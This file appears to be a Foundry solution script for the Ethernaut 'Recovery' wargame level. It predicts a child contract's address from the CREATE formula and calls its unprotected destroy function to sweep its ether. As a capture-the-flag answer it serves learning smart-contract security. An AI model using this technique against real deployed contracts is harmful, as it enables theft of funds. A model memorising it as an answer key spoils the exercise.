// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { SimpleToken } from "./Problem.sol";


contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {

        // Code to predict address of first contract deployed from _instanceAddress
        // Source: https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
        address tokenAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _instanceAddress, bytes1(0x01))))));
        SimpleToken token = SimpleToken(payable(tokenAddress));

        vm.startBroadcast();
        token.destroy(address(0));
        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns(address) {
        return 0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2;
    }

    function getCreationValue() internal view override returns(uint256) {
        return 0.001 ether;
    }
}

